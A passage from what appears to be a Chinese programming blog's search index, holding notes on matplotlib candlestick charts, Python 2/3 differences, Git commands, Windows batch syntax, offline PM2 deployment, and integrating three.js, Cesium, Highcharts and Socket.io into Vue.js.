蜡烛图绘制函数存在日线图的时间间隔问题（非交易日无法跳过，导致图像断裂）。常用解决方法是建议重新调整横坐标，被动地过滤掉非交易时间段[2]。例如：12ax.set_xticks(range(0, len(data[&apos;date&apos;]), 10))ax.set_xticklabels(data[&apos;date&apos;][::10]) 蜡烛图的简单绘制蜡烛图的简单例子如下：12345678910111213141516171819import numpy as npimport talibimport tushare as tsimport matplotlib.pyplot as pltimport mpl_finance as mpf data = ts.get_k_data(&apos;002320&apos;)sma_10 = talib.SMA(np.array(data[&apos;close&apos;]), 10)sma_30 = talib.SMA(np.array(data[&apos;close&apos;]), 30)fig = plt.figure(figsize=(24, 8))ax = fig.add_subplot(1, 1, 1)ax.set_xticks(range(0, len(data[&apos;date&apos;]), 50))ax.set_xticklabels(data[&apos;date&apos;][::50])ax.plot(sma_10, label=&apos;10 日均线&apos;)ax.plot(sma_30, label=&apos;30 日均线&apos;)ax.legend(loc=&apos;upper left&apos;)mpf.candlestick2_ochl(ax, data[&apos;open&apos;], data[&apos;close&apos;], data[&apos;high&apos;], data[&apos;low&apos;],width=0.5, colorup=&apos;r&apos;, colordown=&apos;green&apos;,alpha=0.6)plt.grid()plt.show() 参考链接 https://matplotlib.org/api/finance_api.html, by matplotlib https://ipreacher.github.io/2017/candlestick/, by The North]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[matplotlib用法笔记]]></title>
    <url>%2F2018%2F05%2F26%2Fmatplotlib%E7%94%A8%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[matplotlib 是Python编程语言及其数值数学扩展包 NumPy的可视化操作界面。它为利用通用的图形用户界面工具包，如Tkinter, wxPython, Qt或GTK+向应用程序嵌入式绘图提供了应用程序接口（API）。此外，matplotlib还有一个基于图像处理库（如开放图形库OpenGL）的pylab接口，其设计与MATLAB非常类似—尽管并不怎么好用。SciPy就是用matplotlib进行图形绘制。 基本用法使用plt.figure定义一个图像窗口。1234567import matplotlib.pyplot as pltimport numpy as npx = np.linspace(-1, 1, 50)y = 2*x + 1plt.figure() plt.plot(x, y)plt.show() 设置坐标轴使用plt.xlim设置x坐标轴范围：(-1, 2)； 使用plt.ylim设置y坐标轴范围：(-2, 3)；使用plt.xlabel设置x坐标轴名称：’I am x’； 使用plt.ylabel设置y坐标轴名称：’I am y’；1234plt.xlim((-1, 2))plt.ylim((-2, 3))plt.xlabel(&apos;I am x&apos;)plt.ylabel(&apos;I am y&apos;) 使用np.linspace定义范围以及个数：范围是(-1,2);个数是5. 使用print打印出新定义的范围. 使用plt.xticks设置x轴刻度：范围是(-1,2);个数是5.123new_ticks = np.linspace(-1, 2, 5)print(new_ticks)plt.xticks(new_ticks) 使用plt.yticks设置y轴刻度以及名称：刻度为[-2, -1.8, -1, 1.22, 3]；对应刻度的名称为[‘really bad’,’bad’,’normal’,’good’, ‘really good’]. 使用plt.show显示图像.12plt.yticks([-2, -1.8, -1, 1.22, 3],[r&apos;$really\ bad$&apos;, r&apos;$bad$&apos;, r&apos;$normal$&apos;, r&apos;$good$&apos;, r&apos;$really\ good$&apos;])plt.show() 使用plt.gca获取当前坐标轴信息. 使用.spines设置边框：右侧边框；使用.set_color设置边框颜色：默认白色； 使用.spines设置边框：上边框；使用.set_color设置边框颜色：默认白色；1234ax = plt.gca()ax.spines[&apos;right&apos;].set_color(&apos;none&apos;)ax.spines[&apos;top&apos;].set_color(&apos;none&apos;)plt.show() 调整坐标轴使用.xaxis.set_ticks_position设置x坐标刻度数字或名称的位置：bottom.（所有位置：top，bottom，both，default，none）1ax.xaxis.set_ticks_position(&apos;bottom&apos;) 使用.spines设置边框：x轴；使用.set_position设置边框位置：y=0的位置；（位置所有属性：outward，axes，data）使用.yaxis.set_ticks_position设置y坐标刻度数字或名称的位置：left.（所有位置：left，right，both，default，none）使用.spines设置边框：y轴；使用.set_position设置边框位置：x=0的位置；（位置所有属性：outward，axes，data） 使用plt.show显示图像.1234ax.spines[&apos;bottom&apos;].set_position((&apos;data&apos;, 0))ax.yaxis.set_ticks_position(&apos;left&apos;)ax.spines[&apos;left&apos;].set_position((&apos;data&apos;,0))plt.show() legend图例基本用法123456789101112131415161718192021222324import matplotlib.pyplot as pltimport numpy as npx = np.linspace(-3, 3, 50)y1 = 2*x + 1y2 = x**2plt.figure()#set x limitsplt.xlim((-1, 2))plt.ylim((-2, 3))# set new sticksnew_sticks = np.linspace(-1, 2, 5)plt.xticks(new_sticks)# set tick labelsplt.yticks([-2, -1.8, -1, 1.22, 3], [r&apos;$really\ bad$&apos;, r&apos;$bad$&apos;, r&apos;$normal$&apos;, r&apos;$good$&apos;, r&apos;$really\ good$&apos;])# set line sylesl1, = plt.plot(x, y1, label=&apos;linear line&apos;)l2, = plt.plot(x, y2, color=&apos;red&apos;, linewidth=1.0, linestyle=&apos;--&apos;, label=&apos;square line&apos;)plt.legend(loc=&apos;upper right&apos;) 调整位置和名称1plt.legend(handles=[l1, l2], labels=[&apos;up&apos;, &apos;down&apos;], loc=&apos;best&apos;) 其中’loc’参数有多种，’best’表示自动分配最佳位置。1234567891011&apos;best&apos; : 0, &apos;upper right&apos; : 1,&apos;upper left&apos; : 2,&apos;lower left&apos; : 3,&apos;lower right&apos; : 4,&apos;right&apos; : 5,&apos;center left&apos; : 6,&apos;center right&apos; : 7,&apos;lower center&apos; : 8,&apos;upper center&apos; : 9,&apos;center&apos; : 10, 参考链接 https://zh.wikipedia.org/wiki/Matplotlib, by wikipedia https://morvanzhou.github.io, by morvanzhou]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3与python2的区别与兼容]]></title>
    <url>%2F2018%2F05%2F26%2Fpython3%E4%B8%8Epython2%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%85%BC%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[Python是一种广泛使用的高级编程语言，属于通用型编程语言，由吉多·范罗苏姆创造，第一版发布于1991年。可以视之为一种改良（加入一些其他编程语言的优点，如面向对象）的LISP。作为一种解释型语言，Python的设计哲学强调代码的可读性和简洁的语法（尤其是使用空格缩进划分代码块，而非使用大括号或者关键词）。相比于C++或Java，Python让开发者能够用更少的代码表达想法。不管是小型还是大型程序，该语言都试图让程序的结构清晰明了。 与Scheme、Ruby、Perl、Tcl等动态类型编程语言一样，Python拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且支持多种编程范式，包括面向对象、命令式、函数式和过程式编程。其本身拥有一个巨大而广泛的标准库。 Python 解释器本身几乎可以在所有的操作系统中运行。Python的正式解释器CPython是用C语言编写的、是一个由社区驱动的自由软件，目前由Python软件基金会管理。 python3与python2区别print函数Python 2 的 print 声明在Python 3中已经被 print() 函数取代12345#!/usr/bin/python2print &apos;Hello, World!&apos;#!/usr/bin/python3print(&apos;Hello, World!&apos;) 整除/是精确除法，//是向下取整除法，%是求模。 //和%运算符在2和3版本中一样，但是运算符/不一样。12345678910111213141516171819#!/usr/bin/python2&gt;&gt;&gt; 3 / 21&gt;&gt;&gt; 3 // 21&gt;&gt;&gt; 3 / 2.01.5&gt;&gt;&gt; 3 // 2.01.0#!/usr/bin/python3&gt;&gt;&gt; 3 / 21.5&gt;&gt;&gt; 3 // 21&gt;&gt;&gt; 3 / 2.01.5&gt;&gt;&gt; 3 // 2.01.0 Unicode由于历史遗留问题，Python 2.x版本虽然支持Unicode，但在语法上需要’xxx’和u’xxx’两种字符串表示方式。 在Python 3.x版本中，把’xxx’和u’xxx’统一成Unicode编码，即写不写前缀u都是一样的，而以字节形式表示的字符串则必须加上b前缀：b’xxx’。123456#!/usr/bin/python2#!/usr/bin/python3&gt;&gt;&gt; 中国 = &apos;china&apos; &gt;&gt;&gt; print(中国)china xrange模块在 Python 2 中 xrange() 创建迭代对象的用法是非常流行的。比如： for 循环或者是列表/集合/字典推导式。 在 Python 3 中，range() 是像 xrange() 那样实现以至于一个专门的 xrange() 函数都不再存在（在 Python 3 中 xrange() 会抛出命名异常）。 不等运算符Python 2.x中不等于有两种写法 != 和 &lt;&gt; Python 3.x中去掉了&lt;&gt;, 只有!=一种写法 数据类型 Py3.X去除了long类型，现在只有一种整型——int，但它的行为就像2.X版本的long 新增了bytes类型，对应于2.X版本的八位串 dict的.keys()、.items 和.values()方法返回迭代器，而之前的iterkeys()等函数都被废弃。同时去掉的还有 dict.has_key()，用 in替代它吧 。 异常 在 Python 3 中处理异常也轻微的改变了，在 Python 3 中我们现在使用 as 作为关键词。 捕获异常的语法由 except exc, var 改为 except exc as var。使用语法except (exc1, exc2) as var可以同时捕获多种类别的异常。 Python 2.6已经支持这两种语法。 解析用户的输入 在python2.x中raw_input()和input()，两个函数都存在，其中区别为 raw_input()—-将所有输入作为字符串看待，返回字符串类型 input()——-只能接收“数字”的输入，在对待纯数字输入时具有自己的特性，它返回所输入的数字的类型（int, float） 在python3.x中raw_input()和input()进行了整合，去除了raw_input()，仅保留了input()函数，其接收任意任性输入，将所有输入默认为字符串处理，并返回字符串类型。 返回可迭代对象，而不是列表如果在 xrange 章节看到的，现在在 Python 3 中一些方法和函数返回迭代对象 — 代替 Python 2 中的列表。 因为我们通常那些遍历只有一次，我认为这个改变对节约内存很有意义。尽管如此，它也是可能的，相对于生成器 —- 如需要遍历多次。它是不那么高效的。 而对于那些情况下，我们真正需要的是列表对象，我们可以通过 list() 函数简单的把迭代对象转换成一个列表。12345678910111213#!/usr/bin/python2&gt;&gt;&gt; print range(3) [0, 1, 2]&gt;&gt;&gt; print type(range(3))&lt;type &apos;list&apos;&gt;#!/usr/bin/python3&gt;&gt;&gt; print(range(3))range(0, 3)&gt;&gt;&gt; print(type(range(3)))&lt;class &apos;range&apos;&gt;&gt;&gt;&gt; print(list(range(3)))[0, 1, 2] For循环变量和全局命名空间泄漏在 Python 3.x 中 for 循环变量不会再导致命名空间泄漏。 在 Python 3.x 中做了一个改变，在 What’s New In Python 3.0 中有如下描述：“列表推导不再支持 [… for var in item1, item2, …] 这样的语法。使用 [… for var in (item1, item2, …)] 代替。1234567891011121314151617#!/usr/bin/python2&gt;&gt;&gt; i = 1&gt;&gt;&gt; print &apos;before: i =&apos;, ibefore: i = 1&gt;&gt;&gt; print &apos;comprehension: &apos;, [i for i in range(5)]comprehension: [0, 1, 2, 3, 4]&gt;&gt;&gt; print &apos;after: i =&apos;, iafter: i = 4#!/usr/bin/python3&gt;&gt;&gt; i = 1&gt;&gt;&gt; print(&apos;before: i =&apos;, i)before: i = 1&gt;&gt;&gt; print(&apos;comprehension:&apos;, [i for i in range(5)])comprehension: [0, 1, 2, 3, 4]&gt;&gt;&gt; print(&apos;after: i =&apos;, i)after: i = 1 兼容python3与python2当前python3的普及还不尽人意，因此编写的python程序能同时兼容python2与python3是十分必要的。下面介绍同时支持python2与python3的方法。 放弃python 2.6之前的python版本 使用 2to3 工具对代码检查 使用python -3执行python程序 from future import “from future import”后即可使使用python的未来特性了。python的完整future特性可见 future 。python3中所有字符都变成了unicode。在python2中unicode字符在定义时需要在字符前面加 u，但在3中则不需要家u，而且在加u后程序会无法编译通过。为了解决该问题可以 “from future import unicode_literals” ，这样python2中字符的行为将和python3中保持一致，python2中定义普通字符将自动识别为unicode。 import问题 python3中“少”了很多python2的包，在大多情况下这些包之是改了个名字而已。我们可以在import的时候对这些问题进行处理。 1234567try:#python2 from UserDict import UserDict #建议按照python3的名字进行import from UserDict import DictMixin as MutableMappingexcept ImportError:#python3 from collections import UserDict from collections import MutableMapping 使用python3的方式写程序 检查当前运行的python版本 12345import sysif sys.version &gt; &apos;3&apos;: PY3 = Trueelse: PY3 = False six不推荐使用six。 参考链接 https://zh.wikipedia.org/wiki/Python, by wikipedia https://www.jianshu.com/p/85583e032eb8, by EarthChen http://python.jobbole.com/83987/, by 天地一沙鸥]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git用法总结]]></title>
    <url>%2F2018%2F05%2F24%2FGit%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[git是一个分布式版本控制软件，最初由林纳斯·托瓦兹（Linus Torvalds）创作，于2005年以GPL发布。最初目的是为更好地管理Linux内核开发而设计[1]。 新建代码库12345678# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot; 代码提交123456789101112131415161718# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog 不常用操作 查看代码仓库中标签 1git tag 检出指定标签代码 1git checkout tag_name 丢弃本地修改 1git checkout . 打包导出仓库代码 1git archive --format zip --output ..\emsdk\zips\1.38.8.zip HEAD 参考链接 Git, by wikipedia git 如何获取指定 tag 代码, by 一介布衣 常用 Git 命令清单,by 阮一峰]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成three.js]]></title>
    <url>%2F2018%2F05%2F13%2FVue-js%E9%9B%86%E6%88%90three-js%2F</url>
    <content type="text"><![CDATA[Three.js是一个跨浏览器的脚本，使用JavaScript函数库或API来在网页浏览器中创建和展示动画的三维计算机图形。Three.js使用WebGL。源代码托管在GitHub。 下面介绍在Vue.js中集成three.js的步骤。 安装vue-cli脚手架 安装three.js 1npm install --save three 编写使用three.js创建3D场景的Vuejs组件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;template&gt; &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import * as Three from &apos;three&apos;export default &#123; name: &apos;Home&apos;, data () &#123; return &#123; camera: null, scene: null, renderer: null, mesh: null &#125; &#125;, methods: &#123; init: function () &#123; var container = document.getElementById(&apos;container&apos;) this.camera = new Three.PerspectiveCamera(70, container.clientWidth / container.clientHeight, 0.01, 10) this.camera.position.z = 1 this.scene = new Three.Scene() var geometry = new Three.BoxGeometry(0.2, 0.2, 0.2) var material = new Three.MeshNormalMaterial() this.mesh = new Three.Mesh(geometry, material) this.scene.add(this.mesh) this.renderer = new Three.WebGLRenderer(&#123; antialias: true &#125;) this.renderer.setSize(container.clientWidth, container.clientHeight) container.appendChild(this.renderer.domElement) &#125;, animate: function () &#123; requestAnimationFrame(this.animate) this.mesh.rotation.x += 0.01 this.mesh.rotation.y += 0.02 this.renderer.render(this.scene, this.camera) &#125; &#125;, mounted () &#123; this.init() this.animate() &#125;&#125;&lt;/script&gt;&lt;style rel=&quot;stylesheet/scss&quot; lang=&quot;scss&quot; scoped&gt;#container &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125;&lt;/style&gt; 参考链接 https://zh.wikipedia.org/wiki/Three.js, by Wikipedia https://stackoverflow.com/questions/47849626/import-and-use-three-js-library-in-vue-component, by Stackoverlflow]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows批处理编程语法解析]]></title>
    <url>%2F2018%2F05%2F13%2FWindows%E6%89%B9%E5%A4%84%E7%90%86%E7%BC%96%E7%A8%8B%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[批处理文件(BAT文件)是DOS，OS/2和Microsoft Windows中的一种脚本文件[1]。 它由命令行解释器执行的一系列命令组成，存储在纯文本文件中，通常以BAT为扩展名。批处理文件可以包含解释器交互接受的任何命令，并使用在批处理文件中启用条件分支和循环的构造，如IF，FOR和GOTO标签。在Windows平台自动化部署或处理日常重复性工作时，常使用Windows批处理文件。 下面简单介绍Windows BAT文件的语法。 @ 让执行窗口中不显示它后面这一行的命令本身。12// 使用@将不显示后面的echo off命令@ echo off echo echo即回显或反馈的意思。它由两种状态：打开和关闭。1234// 将不显示后续的命令@ echo off// 将显示后续的命令@ echo on :: 注释命令。在批处理文件中与rem命令等效 call call命令用来从一个批处理文件调用另一个批处理文件。只有当被调用的批处理文件执行完成时，才返回。1call pm2-startup install pause 暂停命令。方便用户查看信息，查看完毕后可继续执行。 explorer 在 cmd 下输入explorer可打开文件夹图形界面，例如：12// 在图形界面中打开当前文件夹explorer . 参考链接 Batch file,by Wikipedia. 批处理最完整人性化教程(.bat文件语法), by s1ihome.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Cesium]]></title>
    <url>%2F2018%2F05%2F11%2FVue-js%E9%9B%86%E6%88%90Cesium%2F</url>
    <content type="text"><![CDATA[近期在研究集成封装Cesium为Vue.js组件，记录一下过程，防止忘了。 安装环境 node.js: v8.9.4 npm: 5.6.0 vue: 2.5.2 cesium: 1.45.0 vue-cli: 2.9.3 webpack: 3.6.0 安装配置 安装nodejs 安装vue-cli脚手架 12345npm install -g vue-clivue init webpack my-projectcd my-projectnpm installnpm run dev 安装cesium 1npm install --save cesium webpack配置 在build/webpack.base.conf.js文件中做如下修改 123456789101112131415161718192021222324252627282930313233343536//定义cesium源代码位置const cesiumSource = &apos;../node_modules/cesium/Source&apos;...module.exports = &#123;...output: &#123; path: config.build.assetsRoot, filename: &apos;[name].js&apos;, publicPath: process.env.NODE_ENV === &apos;production&apos; ? config.build.assetsPublicPath : config.dev.assetsPublicPath, // Needed to compile multiline strings in Cesium sourcePrefix: &apos;&apos; &#125;,amd:&#123; // Enable webpack-friendly use of require in Cesium toUrlUndefined: true &#125;,resolve: &#123; extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;], alias: &#123; &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;, &apos;@&apos;: resolve(&apos;src&apos;), //设置cesium的别名 &apos;cesium&apos;: path.resolve(__dirname, cesiumSource) &#125; &#125;,module: &#123; rules: [ ... ], //不让Webpack打印载入特定库时候的警告 unknownContextCritical: false &#125;,...&#125; 在build/webpack.dev.conf.js文件中做如下修改 12345678910111213141516//定义 Cesium 源代码路径，前面没有../const cesiumSource = &apos;node_modules/cesium/Source&apos;//定义 Cesium Workers 路径const cesiumWorkers = &apos;../Build/Cesium/Workers&apos;...plugins: [ ... new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &apos;Workers&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Assets&apos;), to: &apos;Assets&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Widgets&apos;), to: &apos;Widgets&apos; &#125; ]), new webpack.DefinePlugin(&#123; // Define relative base path in cesium for loading assets CESIUM_BASE_URL: JSON.stringify(&apos;&apos;) &#125;) ... ] 在build/webpack.prod.conf.js文件中做如下修改 12345678910111213141516//定义 Cesium 源代码路径，前面没有../const cesiumSource = &apos;node_modules/cesium/Source&apos;//定义 Cesium Workers 路径const cesiumWorkers = &apos;../Build/Cesium/Workers&apos;...plugins: [ ... new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &apos;Workers&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Assets&apos;), to: &apos;Assets&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Widgets&apos;), to: &apos;Widgets&apos; &#125; ]), new webpack.DefinePlugin(&#123; //定义 Cesium 从哪里加载资源，如果使用默认的&apos;&apos;，却变成了绝对路径了，所以这里使用&apos;./&apos;,使用相对路径 CESIUM_BASE_URL: JSON.stringify(&apos;./&apos;) &#125;) ... ] Vue.js组件编写 在src/components下新建 CesiumViewer.vue vue组件 12345678910111213141516171819202122232425&lt;template&gt; &lt;div id=&quot;cesiumContainer&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script type=&quot;text/javascript&quot;&gt;import Cesium from &apos;cesium/Cesium&apos;import widgets from &apos;cesium/Widgets/widgets.css&apos;export default &#123; name: &apos;CesiumViewer&apos;, mounted () &#123; var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;) &#125;&#125;&lt;/script&gt;&lt;style rel=&quot;stylesheet/scss&quot; lang=&quot;scss&quot; scoped&gt;#cesiumContainer &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125;&lt;/style&gt; 创建全局样式文件src/styles/index.scss，做如下修改 12345678html,body &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125; 在src/main.js中做如下修改 1import &apos;@/styles/index.scss&apos; // global css 参考链接 https://www.jianshu.com/p/fb237c7eb48c, by QingMings https://cesiumjs.org/tutorials/cesium-and-webpack/, by cesiumjs.org]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[离线环境下Node.js应用部署方法]]></title>
    <url>%2F2018%2F05%2F10%2F%E7%A6%BB%E7%BA%BF%E7%8E%AF%E5%A2%83%E4%B8%8BNode-js%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[离线环境下Node.js应用部署时需要解决以下三个基本问题： Node.js应用的进程管理，如性能监控、自动重启、负载均衡等 Node.js应用开机如何自启动 离线环境下如何部署Node.js应用 下面以在Windows Server 2012上离线部署Node.js应用为例，记录上述问题的解决方案： Node.js应用的进程管理在生产环境中运行 Express 应用程序时，使用进程管理器对于完成以下任务很有帮助[1]： 在应用程序崩溃后将其重新启动。 获得对运行时性能和资源消耗的洞察。 动态修改设置以改善性能。 控制集群。 进程管理器有点类似于应用程序服务器：它是应用程序的“容器”，可促进部署，提供高可用性并使您可以在运行时管理应用程序。 用于 Express 和其他 Node.js 应用程序的最流行的进程管理器包括： StrongLoop Process Manager PM2 Forever 上述三种工具的比较请参阅http://strong-pm.io/compare/。其中，StrongLoop Process Manager无法在Windows平台工作，再综合比较PM2和Forever，由于Forever没有操作系统自启动的脚本，故选择PM2作为Windows平台Node.js应用的进程管理器。 Node.js应用开机如何自启动选择PM2作为Node.js应用的进程管理器后，Node.js应用开机自启动的问题就变为如何开机自启动PM2。Windows平台存在两个自启动PM2的脚本： pm2-windows-service pm2-windows-startup pm2-windows-service基于 node-windows将PM2注册为Windows服务，从而实现自启动。pm2-windows-startup则基于start-on-windows-boot在注册表中将PM2设为自启动程序，从而实现自启动。两种方案经测试，只有pm2-windows-startup在Windows Server 2012上可行，故选择pm2-windows-startup作为解决Node.js应用开机自启动的方案。 离线环境下如何部署Node.js应用PM2和pm2-windows-startup必须全局安装，如何简单方便地在离线环境下全局安装这两个模块是一个问题。网上搜到的方法有： npm link npm-bundle npm link[2]是npm的一个命令，可将本地包链接成全局包，但实际测试过程中，无法解决PM2包的依赖问题，故放弃。而npm-bundle[3]则能很好的解决PM2的依赖问题。具体过程为：12345\\在线环境下npm install -g npm-bundlenpm-bundle pm2\\离线环境下call npm install .\pm2-2.10.3.tgz -g 参考链接 http://expressjs.com/zh-cn/advanced/pm.html, by Express https://blog.csdn.net/fay462298322/article/details/53432691, by 爱死费崇政 https://stackoverflow.com/questions/41156556/what-exact-command-is-to-install-pm2-on-offline-rhel, by stackoverflow]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Highcharts]]></title>
    <url>%2F2018%2F05%2F10%2FVue-js%E9%9B%86%E6%88%90Highcharts%2F</url>
    <content type="text"><![CDATA[Vue.js集成Highcharts方法 安装highcharts 1npm install --save highcharts 封装hightcharts成Vue.js组件 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div class=&quot;highcharts-container&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Highcharts from &apos;highcharts/highstock&apos;import HighchartsMore from &apos;highcharts/highcharts-more&apos;import HighchartsDrilldown from &apos;highcharts/modules/drilldown&apos;import Highcharts3D from &apos;highcharts/highcharts-3d&apos;HighchartsMore(Highcharts)HighchartsDrilldown(Highcharts)Highcharts3D(Highcharts)export default &#123; props: [&apos;options&apos;], name: &apos;HighCharts&apos;, data () &#123; return &#123; chart: null &#125; &#125;, watch: &#123; options: function (newVal, oldVal) &#123; // watch it this.chart.update(newVal, true) &#125; &#125;, mounted () &#123; this.initChart() &#125;, methods: &#123; initChart () &#123; this.chart = new Highcharts.Chart(this.$el, this.options) &#125; &#125;&#125;&lt;/script&gt; 在src/main.js引入组件 12import HighCharts from &apos;./components/HighCharts.vue&apos;Vue.component(&apos;HighCharts&apos;, HighCharts) 使用组件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;template&gt; &lt;div class=&quot;radarGraph&quot;&gt; &lt;HighCharts :options=&quot;options&quot; class=&quot;radar&quot; &gt;&lt;/HighCharts&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &apos;RadarGraph&apos;, computed: &#123; gameInfo () &#123; return this.$store.state.gameInfo &#125;, options () &#123; return &#123; chart: &#123; polar: true, type: &apos;line&apos;, marginTop: 0, marginBottom: 0, marginLeft: 0, marginRight: 0 &#125;, credits: &#123; enabled: false &#125;, pane: &#123; size: &apos;75%&apos; &#125;, title: null, legend: &#123; enabled: false &#125;, xAxis: &#123; categories: [&apos;分类1&apos;, &apos;分类2&apos;, &apos;分类3&apos;, &apos;分类4&apos;, &apos;分类5&apos;, &apos;分类6&apos; ], labels: &#123; style: &#123; fontSize: &apos;14px&apos; &#125; &#125;, tickmarkPlacement: &apos;on&apos;, lineWidth: 0 &#125;, yAxis: &#123; gridLineInterpolation: &apos;polygon&apos;, lineWidth: 0, min: 0 &#125;, series: [&#123; type: &apos;area&apos;, name: &apos;得分&apos;, data: [this.gameInfo.radar1, this.gameInfo.radar2, this.gameInfo.radar3, this.gameInfo.radar4, this.gameInfo.radar5, this.gameInfo.radar6], pointPlacement: &apos;on&apos; &#125;] &#125; &#125;, ...mapGetters([ &apos;userId&apos; ]) &#125;, created () &#123; this.fetchData() &#125;, methods: &#123; fetchData () &#123; this.$store.dispatch(&apos;GetGameInfo&apos;, this.userId) &#125; &#125;&#125;&lt;/script&gt; 参考链接 https://blog.jianshukeji.com/2017/09/use-highcharts-with-vue/]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Socket.io]]></title>
    <url>%2F2018%2F05%2F09%2FVue-js%E9%9B%86%E6%88%90Socket-io%2F</url>
    <content type="text"><![CDATA[Socket.IO简介 Socket.IO 是一个面向实时 web 应用的 JavaScript 库。它使得服务器和客户端之间实时双向的通信成为可能。他有两个部分：在浏览器中运行的客户端库，和一个面向Node.js的服务端库。两者有着几乎一样的API。像Node.js一样，它也是事件驱动的. Socket.IO 主要使用WebSocket协议。但是如果需要的话，Socket.io可以回退到几种其它方法，例如Adobe Flash Sockets，JSONP拉取，或是传统的AJAX拉取，[2]并且在同时提供完全相同的接口。尽管它可以被用作WebSocket的包装库，它还是提供了许多其它功能，比如广播至多个套接字，存储与不同客户有关的数据，和异步IO操作。 Vue.js集成Socket.IO 安装socket.io-client 1npm install --save socket.io-client 在src/main.js中载入socket.io-client 123import io from &apos;socket.io-client&apos;const socket = io(process.env.BASE_API)Object.defineProperty(Vue.prototype, &apos;$socket&apos;, &#123; value: socket &#125;) 在Vuejs组件中使用socket.io-client 1this.$socket.on(&apos;event&apos;,function(e)&#123;&#125;) 参考链接 https://zh.wikipedia.org/wiki/Socket.IO, by Wikipedia https://socket.io/get-started/chat/, by socket.io]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
